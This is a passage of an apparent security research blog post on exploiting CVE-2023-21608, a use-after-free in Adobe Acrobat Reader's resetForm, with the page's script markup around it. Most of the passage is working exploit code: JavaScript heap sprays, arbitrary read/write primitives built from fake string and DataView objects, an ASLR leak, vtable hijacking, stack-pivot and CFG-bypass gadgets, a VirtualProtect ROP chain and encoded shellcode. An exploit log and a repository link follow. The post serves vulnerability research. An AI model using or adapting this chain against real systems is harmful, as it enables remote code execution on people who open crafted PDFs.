+ \" : length: \" + bufs[i].byteLength + \" : buf length: \" + bufs.length);\n    ...\n  }\n}\n```\n\n## Out-of-bounds to Arbitrary Read-Write Primitives\n\nOnce **out-of-bounds read-write** primitives are achieved on the `ArrayBuffer`, the second JavaScript Array is used to create the `addrOf` primitive. To be able to **read-write** from `Array`, a set of **Arrays** of **length** similar to `ArrayBuffer` are sprayed so that the allocations of the `Array` land just after `ArrayBuffer` spray as shown below.\n\n```\n-------------------------------------------------------------------------------\n|        |        |        |         |        |   |       |       |   |       |\n|arrbuf_1|arrbuf_2|arrbuf_3|.........|arrbuf_n|...|array_1|array_2|...|array_n|\n|        |        |        |         |        |   |       |       |   |       |\n-------------------------------------------------------------------------------\n```\n\nWith `ArrayBuffer` **out-of-bounds** access, we can find the start of the first `Array` and use it to further create another set of primitives.\n\n1. `addrOf` - leak address of any JavaScript object\n2. `poi` - leak value at a given address (this initial form of `AAR` is required to create full `AAR/AAW`)\n3. `AAR` - read the arbitrary value at a given address\n4. `AAW` - write value at a given address\n\n### Spraying large Array\n\n- We need to allocate a few large `Array` just after our sprayed `ArrayBuffer`\n- Once we corrupt the length of the `ArrayBuffer` we can locate this `Array` and corrupt the adjacent `Array` for **arbitrary read-write** primitives\n- However, the JavaScript `Array` reallocations seem to be growing in a certain pattern when we tried to add large elements in the loop to the `Array`\n\n```js\nfor(var k = 0; k\u003cN; k++) {\n  _arr_.push(0x41414141);\n}\n```\n\n- After some testing, we observed that the **reallocation length** can be partially controlled by allocating `Array` with initial contents\n\n```js\n// initial contents are ajusted after testing few iterations\n// to be maximum enough to be allocated just after sprayed ArrayBuffer\nvar _arr_ = new Array(1, 2, 3, 4);\n```\n\n#### Controlled Array Spraying\n\n1. `Array` with initializer should start with the allocation of `0x003f0`\n2. Further, elements initialization inside **for loop** should increase the allocation sizes using **reallocs**\n3. Increment of `Array` length happens as: `0x003f0 -\u003e 0x007d0 -\u003e 0x00f90 -\u003e 0x01f10 -\u003e 0x03e10 -\u003e 0x07c10 -\u003e 0x0f810`\n4. Re-allocations with size `0x0f810` should land the `Array` allocations just after the last `ArrayBuffer` from our spray\n5. When we read **out-of-bound** from a corrupted `ArrayBuffer`, we should be able to read the contents of the sprayed `Array`\n\n```js\nfor (var i = 0; i \u003c 0x10; i++) {\n  arrayRefs[i] = new Array(\n    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,\n    21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,\n    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60,\n    61, 62\n  );\n  arrayRefs[i][0] = 0x47484950;\n  arrayRefs[i][1] = targetStr;       // string object, we use for arbitrary read\n  arrayRefs[i][2] = targetDataView;  // DataView we use for crafting AAR/AAW\n\n  for (var k = 3; k \u003c 5000; k++) {\n    arrayRefs[i][k] = 0x50515051;\n  }\n}\n```\n\nThe final `Array` allocation should look as given below.\n\n```\nEScript!sub_1004DBA9+0xa4:\n6a41dc4d 8bf8            mov     edi,eax\n0:000\u003e g\n24188270  00000000 00000f80 00000f80 00000f80  ................\n24188280  47484950 ffffff81 0db3c420 ffffff85  PIHG.... .......\n24188290  0dda27c0 ffffff87 50515051 ffffff81  .'......QPQP....\n241882a0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....\n241882b0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....\n241882c0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....\n241882d0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....\n241882e0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....\n\n0:015\u003e !ext.heap -p -a 24188270\n    address 24188270 found in\n    _HEAP @ 4f10000\n      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n        24188268 1f03 0000  [00]   24188270    0f810 - (busy)\n```\n\nWhere `0db3c420 ffffff85` is `targetStr` and `0dda27c0 ffffff87` is `targetDataView`.\n\n## addrOf Primitive\n\nThe `addrOf` primitive allows us to leak the address of any **JavaScript** object by reading the address of the object stored in a sprayed `Array` using **out-of-bounds** primitives. The `corruptedTypedArr` is a **typed array** with a corrupted `ArrayBuffer` length, and `arrStart` is the **index** where the JavaScript `Array` is located from the start of the corrupted `ArrayBuffer`. The `modified_arr` is the JavaScript `Array` from the sprayed Arrays that we will use for corruption and address leakage.\n\n```js\nfunction addrOf(obj)\n{\n  modified_arr[0] = obj;\n  addr = corruptedTypedArr[arrStart+4];\n  return addr;\n}\n```\n\n## Temporary Arbitrary Read Primitive\n\n`poi` primitive allows us to read the value at an arbitrary address.\n\nTo achieve `poi` primitive, we need to perform a few steps:\n\n1. Allocate a string in global scope like `var targetStr = \"Hello\";`\n2. Spray the above string object as an element in sprayed arrays `arrs[i][1] = targetStr;`\n3. Spray fake string structure inside sprayed `ArrayBuffer`\n\n```js\nuintArr[FAKE_STR_START] = 0x102; // type\nuintArr[FAKE_STR_START+1] = arrBufPtr+0x40; // buffer\n```\n\n4. Once **out-of-bounds** primitives are achieved, we assign the fake string to the address of sprayed string object from array `uintArr[arrStart+6] = FAKE_STR;`.\n5. Now, `targetStr` which was sprayed along with `Array` can be confused with fake string.\n6. Reading values from the given arbitrary address are achieved by setting `addr` to the **backing buffer** pointer of the fake string and then normally reading the `targetStr` object of our modified `Array`. This will allow us to read values from arbitrary addresses.\n\n```js\nfunction s2h(s) {\n  var n1 = s.charCodeAt(0)\n  var n2 = s.charCodeAt(1)\n  return ((n2\u003c\u003c16) | n1) \u003e\u003e\u003e 0\n}\n\nfunction poi(addr)\n{\n  // leak values at addr by setting it to string pointer\n  corruptedTypedArr[FAKE_STR_START+1] = addr;\n  val = s2h(modified_arr[1]);\n  return val;\n}\n```\n\n## Arbitrary Read-Write Primitives\n\nOnce we achieve **out-of-bounds read-write** on the `ArrayBuffer`, we can use the `addrOf` and `poi` primitives to perform **arbitrary reads**. With these primitives, we can derive full **arbitrary read-write** primitives by using the JavaScript `DataView` object.\n\nTo create **arbitrary read-write** primitives using a `DataView` object, we can follow these steps:\n\n1. Create a `DataView` object with a valid `ArrayBuffer` and set an initial value for it:\n\n```js\nvar targetDV  = new DataView(new ArrayBuffer(0x64));\ntargetDV.setUint32(0, 0x55555555, true);\n```\n\n2. Spray the `targetDV` object as an element in an `Array` of sprayed Arrays:\n\n```js\nfor (var i=0; i\u003c0x10; i++)\n{\n  ...\n  arrs[i][2] = targetDV;\n  ...\n}\n```\n\n3. Create a fake `DataView` object by spraying an `ArrayBuffer` and setting a **magic number** value at the start of the spray.\n\n```js\nuintArr[FAKE_DV_START] = 0x77777777;\n```\n\n4. Once **out-of-bounds** primitives are achieved, assign the fake `DataView` object to the address of the **sprayed** `DataView` object.\n\n```js\nuintArr[arrStart + 8] = FAKE_DV;\n```\n\n5. Clone the contents of the valid `DataView` object into the fake `DataView` using the previously constructed primitives.\n\n```js\nvar targetDVPtr = addrOf(targetDV);\n\nfor (var k=0; k\u003c32; k++)\n{\n  corruptedTypedArr[FAKE_DV_START + k] = poi(targetDVPtr + (k * 4));\n}\n```\n\n6. Finally, to perform **arbitrary read-write**, set up the fake `DataView` object's backing `ArrayBuffer` pointer and **read/write** from the `DataView` object.\n\n```js\nfunction AAR(addr)\n{\n  corruptedTypedArr[FAKE_DV_START + 20] = addr;\n  return modified_arr[2].getUint32(0, true);\n}\n\nfunction AAW(addr, value)\n{\n  corruptedTypedArr[FAKE_DV_START + 20] = addr;\n  modified_arr[2].setUint32(0, value, true);\n}\n```\n\n### Shellcode Execution\n\nTo execute shellcode, we use the **arbitrary read-write** (`AAR/AAW`) primitives to bypass `ASLR` and `CFG`.\n\nThe steps are as follows:\n\n1. Bypass `ASLR` by leaking the `AcroForm.api` base address from the `field` object\n\n```js\nvar AcroFormApiBase = AAR(AAR(addrOf(testField) + 0x10) + 0x34) - 0x00293fe0\n```\n\n2. Leak the address of the field `vtable`\n\n```js\nvar fieldVtblAddr = AAR(AAR(AAR(AAR(addrOf(testField) + 0x10) + 0x10) + 0xc) + 4)\nvar fieldVtbl = AAR(fieldVtblAddr)\n```\n\n3. Clone the **vtable** into the heap (cloning is necessary as we do not have the **write** permission on the **vtable** address). We clone it to our chosen heap address (picked from the `ArrayBuffer` spray) and make further modifications there.\n\n```js\nfor(var i=0; i \u003c 32; i++) {\n  AAW(arrBufPtr + 0x100 + (i * 4), AAR(fieldVtbl + i * 4));\n}\n```\n\n4. Perform **stack pivoting** into our controlled heap for shellcode execution. We prepare a **fake stack** on the heap with the necessary details as shown below:\n\n```js\nAAW(arrBufPtr+0x100+0x48, AcroFormApiBase+0x6faa60);  // CFG gadget = AcroForm!sub_20EFAA60;\nAAW(arrBufPtr+0x100+0x30, AcroFormApiBase+0x256984);  // 0x6b5e6984: mov esp, eax; dec ecx; ret;\nAAW(arrBufPtr+0x100, AcroFormApiBase+0x1e646);        // 0x6b3ae646: pop esp; ret;\nAAW(arrBufPtr+0x100+4, arrBufPtr+0x300);              // our pivoted stack\nAAW(fieldVtblAddr, arrBufPtr+0x100);                  // field vtable\n```\n\n5. Set up **ROP** and execute the **shellcode**\n\n```js\nvar rop = [\n  AAR(AcroFormApiBase+0x007da108),  // virtualprotect\n  arrBufPtr+0x400,                  // return address\n  arrBufPtr+0x400,                  // buffer\n  0x1000,                           // sz\n  0x40,                             // new protect\n  arrBufPtr+0x340\n];\n\nfor(var i=0; i \u003c rop.length; i++) {\n  AAW(arrBufPtr + 0x300 + 4 * i, rop[i]);\n}\n\nvar shellcode = [ 0x90909090,\n  835867240, 1667329123, 1415139921, 1686860336, 2339769483,\n  1980542347, 814448152, 2338274443, 1545566347, 1948196865,\n  4270543903, 605009708, 390218413, 2168194903, 1768834421,\n  4035671071, 469892611, 1018101719, 2425393296 ];\n\nfor(var i=0; i \u003c shellcode.length; i++) {\n  AAW(arrBufPtr+0x400+i*4, re(shellcode[i]));\n}\n```\n\n6. Finally, invoke the **shellcode** by calling the `defaultValue` property on the `testField` object.\n\n```js\nvar ret = testField.defaultValue;\n```\n\n## Control Flow Guard (CFG) Bypass\n\n**Adobe Acrobat Reader** has **CFG** enabled by default, so it is not possible to call the shellcode directly. Previous versions of exploits relied on using **non-CFG** modules within **Adobe Reader** to create the **ROP** chain, but newer versions have all modules **CFG** enabled.\n\nOne way to bypass this is to use the call sites that are not **CFG** instrumented. We found multiple **non-CFG** instrumented call sites that could be used to bypass **CFG** in **Adobe Acrobat Reader**. One of these functions is `sub_20EFAA60`, which allows us to **call an address** that we **control** by storing it in the `ecx` register.\n\n```\n.text:20EFAA60 ; int __thiscall sub_20EFAA60(void *this)\n.text:20EFAA60 sub_20EFAA60    proc near               ; DATA XREF: .rdata:20FF8C11âo\n.text:20EFAA60                                         ; .rdata:21131674âo ...\n.text:20EFAA60                 mov     eax, [ecx]\n.text:20EFAA62                 push    0Dh\n.text:20EFAA64                 call    dword ptr [eax+30h]\n.text:20EFAA67                 retn\n.text:20EFAA67 sub_20EFAA60    endp\n```\n\nThis can be used to control the program's execution and execute the shellcode.\n\n## Context Restoration and Recovery\n\nAfter running the shellcode, the **Acrobat Reader** crashes because the relevant **context** has not been restored. To make the **Adobe Acrobat Reader** continue running after exploitation, it is important to restore this **context**.\n\nThis involves several steps:\n\n- Restoring `targetStr` and `targetDV` using the fake `string` and `DataView` that were created earlier\n- Restoring the original `vtable` that was hijacked for code execution\n- Fixing any corruption caused by the `ArrayBuffer` corruption and other side effects of this corruption\n- Restoring the **stack** (this is done in the shellcode recovery part)\n- Restoring `ESP` to its **default** value (this is also done in the shellcode recovery part)\n- Backing up **original** values **before** corruption so they can be **restored** once the shellcode is executed (this is shown in the below snippet)\n\nThe below snippet shows how some of the original values are backed up before corruption so they can be restored once the shellcode has been executed.\n\n```js\nlog(\"[+] Storing recovery context\");\n\nAAW(FAKE_STACK_PTR + 0x60, fieldVtblAddr);                // original vtable ptr (goes back in ECX)\nAAW(FAKE_STACK_PTR + 0x64, fieldVtbl);                    // vtable funcs ptr\nAAW(FAKE_STACK_PTR + 0x68, originalDefaultValFunc);       // original defaultVal impl to jump to\nAAW(FAKE_STACK_PTR + 0x6c, AAR(ARRAY_BUFFER_BASE + 8));   // corrupted ArrayBuffer typed array ptr\nAAW(FAKE_STACK_PTR + 0x70, AAR(ARR_BUF_MALLOC_BASE));     // malloc header 0\nAAW(FAKE_STACK_PTR + 0x74, AAR(ARR_BUF_MALLOC_BASE + 4)); // malloc header 1\n```\n\n## Exploit Log\n\n```\n[+] Acrobat Reader Remote Code Execution\n    [*] Version: 21.01120039\n[+] Spraying ArrayBuffer of size: 0xffe8\n[+] Grooming LFH blocks of size: 68 count: 4000\n[+] Triggering garbage collection\n[+] Triggering vulnerability\n[+] Finding required objects\n    [*] Corrupted ArrayBuffer idx: 4604 byteLength: 0x24043250\n    [*] addrOf Array start idx: 13221884\n    [*] addrOf Array idx: 0\n[+] Gaining arbitrary read \u0026 write primitive\n    [*] Crafting fake DataView: 0x200001d8\n[+] Fixing corrupted objects\n    [*] Typed array pointer\n    [*] Typed array node pointers\n    [*] V1 Idx: 4602 address: 0x131cf240 value: 0xd0b8600 correct value: 0xd0b86a0\n    [*] ArrayBuffer field\n    [*] Fake string\n[+] Finding required modules\n    [*] AcroForm.api: 0x6ef70000\n    [*] KERNEL32.dll: 0x769a0000\n    [*] VirtualProtect: 0x769c04c0\n[+] Finding gadgets in AcroForm.api\n    [*] CFG bypass gadget: 0x6f66aa60\n    [+] Stack pivot gadgets\n        [*] xchg eax, esp; ret: 0x6ef8e5e6\n        [*] pop esp; ret: 0x6ef8e646\n[+] Setting up ROP and shellcode\n    [*] Payload: 0x2459edd8\n[^] Executing payload\n[+] Exploit duration: 6.172 seconds\n```\n\n## 64-bit Exploitation\n\nThe **CVE-2023-21608** bug also affected the **64-bit** version of the **Adobe Reader**. We evaluated the possibility of exploiting this bug on the **64-bit** version.\n\nHowever, we stumbled upon **2 major issues**:\n\n1. The heap spraying is no longer possible in **64-bit** address space. Hence, we could no longer rely on `ArrayBuffer` spraying technique outlined above to allocate controlled data at predictable addresses. We now need a separate **info-leak** bug for further exploitation.\n2. But finding an **info-leak** is not a difficult task. The core problem that makes this bug useless for **64-bit** exploitation is that the sprayed strings are used as aggregation objects, where new strings are created from the sprayed string. While creating a new string the standard C null terminators are considered. We can't use any addresses which have **two** consecutive `NULL` bytes in them. This will stop the string copy and we will never be able to re-allocate the freed memory with a controlled chunk that has the leaked `ArrayBuffer` address in it. The bug would no longer be effective and reproducible. This limits us from the possibility of exploiting this bug on the **64-bit** version.\n\n## Exploit Repository\n\n\u003chttps://github.com/hacksysteam/CVE-2023-21608\u003e\n\n## Demo Video\n\n\u003chttps://www.youtube.com/embed/cguBkC0opXk\u003e\n\n## Further Reading\n\n- [CVE-2020-9715: Exploiting the Adobe ESObject Use-After-Free Vulnerability](https://www.pixiepointsecurity.com/blog/nday-cve-2020-9715.html)\n- [CVE-2020-9715: Exploiting a Use-After-Free in Adobe Reader](https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader)\n- [tianfu Adobe exploit code](https://github.com/zuypt/Tianfucup19-Adobe-exploit/blob/master/adobe_tfc19.js)\n- [tianfu Writeup](https://starlabs.sg/blog/2020/04/tianfu-cup-2019-adobe-reader-exploitation/)\n- [Analysis of a use-after-free Vulnerability in Adobe Acrobat Reader DC - CVE-2020-9715](https://blog.exodusintel.com/2021/04/20/analysis-of-a-use-after-free-vulnerability-in-adobe-acrobat-reader-dc/)\n- [Analysis of a Heap Buffer-Overflow Vulnerability in Adobe Acrobat Reader DC - CVE-2021-39863](https://blog.exodusintel.com/2021/10/04/analysis-of-a-heap-buffer-overflow-vulnerability-in-adobe-acrobat-reader-dc-2/)\n- [Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit](https://srcincite.io/blog/2018/05/21/adobe-me-and-a-double-free.html)\n- [CVE-2020-9715 Exploit Code](https://github.com/lsw29475/CVE-2020-9715/blob/main/exp.js)\n- [CFG Internals](https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively-wp.pdf)\n- [Javascript Internals](https://downloads.immunityinc.com/infiltrate-archives/the_shadow_over_firefox_infiltrate_2015.pdf)\n- [SpiderMonkey GC Source](https://github.com/rolandoam/spidermonkey/blob/master/js/src/jsgc.cpp)\n"])</script><script>self.__next_f.push([1,"b:[[\"$\",\"div\",null,{\"className\":\"-mt-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"mb-8\",\"children\":[\"$\",\"h1\",null,{\"className\":\"text-3xl md:text-4xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent\",\"children\":\"Adobe Acrobat Reader - resetForm - CAgg - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2023-21608\"}]}]}],[\"$\",\"$L19\",null,{\"slug\":\"adobe-reader-resetform-cagg-rce-cve-2023-21608\",\"frontmatter\":{\"title\":\"Adobe Acrobat Reader - resetForm - CAgg - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2023-21608\",\"date\":\"February 2, 2023\",\"authors\":[\"Ashfaq Ansari\",\"Krishnakant Patil\"],\"excerpt\":\"This post provides a thorough examination of a notable remote code execution vulnerability found in Adobe Reader. Specifically, the resetForm method is under scrutiny, revealing how its flawed implementation can be exploited by attackers. (CVE-2023-21608)\",\"tags\":[\"adobe\",\"Adobe Reader\",\"cve-2023-21608\",\"dep\",\"aslr\",\"use-after-free\",\"uaf\",\"adobe\",\"rce\",\"resetForm\",\"cfg bypass\",\"rop\",\"exploit\"]},\"content\":\"$1a\",\"tocItems\":[{\"id\":\"overview\",\"text\":\"Overview\",\"depth\":2},{\"id\":\"advisory\",\"text\":\"Advisory\",\"depth\":2},{\"id\":\"testbed\",\"text\":\"Testbed\",\"depth\":2},{\"id\":\"proof-of-concept\",\"text\":\"Proof of Concept\",\"depth\":2},{\"id\":\"crash-state\",\"text\":\"Crash State\",\"depth\":2},{\"id\":\"stack-trace\",\"text\":\"Stack Trace\",\"depth\":3},{\"id\":\"root-cause-analysis\",\"text\":\"Root Cause Analysis\",\"depth\":2},{\"id\":\"heap-grooming\",\"text\":\"Heap Grooming\",\"depth\":3},{\"id\":\"spidermonkey-internals-in-escriptapi\",\"text\":\"SpiderMonkey Internals in EScript.API\",\"depth\":2},{\"id\":\"arraybuffer\",\"text\":\"ArrayBuffer\",\"depth\":3},{\"id\":\"array\",\"text\":\"Array\",\"depth\":3},{\"id\":\"exploitation\",\"text\":\"Exploitation\",\"depth\":2},{\"id\":\"strategy\",\"text\":\"Strategy\",\"depth\":3},{\"id\":\"spraying-arraybuffer\",\"text\":\"Spraying ArrayBuffer\",\"depth\":3},{\"id\":\"locating-arraybuffer\",\"text\":\"Locating ArrayBuffer\",\"depth\":4},{\"id\":\"out-of-bounds-to-arbitrary-read-write-primitives\",\"text\":\"Out-of-bounds to Arbitrary Read-Write Primitives\",\"depth\":2},{\"id\":\"spraying-large-array\",\"text\":\"Spraying large Array\",\"depth\":3},{\"id\":\"controlled-array-spraying\",\"text\":\"Controlled Array Spraying\",\"depth\":4},{\"id\":\"addrof-primitive\",\"text\":\"addrOf Primitive\",\"depth\":2},{\"id\":\"temporary-arbitrary-read-primitive\",\"text\":\"Temporary Arbitrary Read Primitive\",\"depth\":2},{\"id\":\"arbitrary-read-write-primitives\",\"text\":\"Arbitrary Read-Write Primitives\",\"depth\":2},{\"id\":\"shellcode-execution\",\"text\":\"Shellcode Execution\",\"depth\":3},{\"id\":\"control-flow-guard-cfg-bypass\",\"text\":\"Control Flow Guard (CFG) Bypass\",\"depth\":2},{\"id\":\"context-restoration-and-recovery\",\"text\":\"Context Restoration and Recovery\",\"depth\":2},{\"id\":\"exploit-log\",\"text\":\"Exploit Log\",\"depth\":2},{\"id\":\"64-bit-exploitation\",\"text\":\"64-bit Exploitation\",\"depth\":2},{\"id\":\"exploit-repository\",\"text\":\"Exploit Repository\",\"depth\":2},{\"id\":\"demo-video\",\"text\":\"Demo Video\",\"depth\":2},{\"id\":\"further-reading\",\"text\":\"Further Reading\",\"depth\":2}]}]]\n"])</script><script>self.__next_f.push([1,"10:null\n"])</script><script>self.__next_f.push([1,"14:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nf:null\n"])</script><script>self.__next_f.push([1,"17:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Adobe Acrobat Reader - resetForm - CAgg - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2023-21608 | HackSys Inc Blog\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"This post provides a thorough examination of a notable remote code execution vulnerability found in Adobe Reader. Specifically, the resetForm method is under scrutiny, revealing how its flawed implementation can be exploited by attackers. (CVE-2023-21608)\"}],[\"$\",\"link\",\"2\",{\"rel\":\"manifest\",\"href\":\"/manifest.webmanifest\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"meta\",\"3\",{\"name\":\"keywords\",\"content\":\"adobe, Adobe Reader, cve-2023-21608, dep, aslr, use-after-free, uaf, adobe, rce, resetForm, cfg bypass, rop, exploit\"}],[\"$\",\"meta\",\"4\",{\"name\":\"script:ld+json\",\"content\":\"{\\\"@context\\\":\\\"https://schema.org\\\",\\\"@type\\\":\\\"Article\\\",\\\"headline\\\":\\\"Adobe Acrobat Reader - resetForm - CAgg - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2023-21608\\\",\\\"datePublished\\\":\\\"2023-02-02T00:00:00.000Z\\\",\\\"author\\\":{\\\"@type\\\":\\\"Person\\\",\\\"name\\\":\\\"Ashfaq Ansari\\\"},\\\"description\\\":\\\"This post provides a thorough examination of a notable remote code execution vulnerability found in Adobe Reader. Specifically, the resetForm method is under scrutiny, revealing how its flawed implementation can be exploited by attackers. (CVE-2023-21608)\\\",\\\"publisher\\\":{\\\"@type\\\":\\\"Organization\\\",\\\"name\\\":\\\"HackSys Inc\\\",\\\"logo\\\":{\\\"@type\\\":\\\"ImageObject\\\",\\\"url\\\":\\\"https://hacksys.io/logo.svg\\\"}},\\\"url\\\":\\\"https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608\\\",\\\"mainEntityOfPage\\\":{\\\"@type\\\":\\\"WebPage\\\",\\\"@id\\\":\\\"https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608\\\"}}\"}],[\"$\",\"link\",\"5\",{\"rel\":\"canonical\",\"href\":\"https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:title\",\"content\":\"Adobe Acrobat Reader - resetForm - CAgg - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2023-21608\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:description\",\"content\":\"This post provides a thorough examination of a notable remote code execution vulnerability found in Adobe Reader. Specifically, the resetForm method is under scrutiny, revealing how its flawed implementation can be exploited by attackers. (CVE-2023-21608)\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:url\",\"content\":\"https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"article\"}],[\"$\",\"meta\",\"10\",{\"property\":\"article:published_time\",\"content\":\"2023-02-02T00:00:00.000Z\"}],[\"$\",\"meta\",\"11\",{\"property\":\"article:author\",\"content\":\"Ashfaq Ansari\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:title\",\"content\":\"Adobe Acrobat Reader - resetForm - CAgg - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2023-21608\"}],[\"$\",\"meta\",\"14\",{\"name\":\"twitter:description\",\"content\":\"This post provides a thorough examination of a notable remote code execution vulnerability found in Adobe Reader. Specifically, the resetForm method is under scrutiny, revealing how its flawed implementation can be exploited by attackers. (CVE-2023-21608)\"}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"12:{\"metadata\":\"$17:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script></body></html>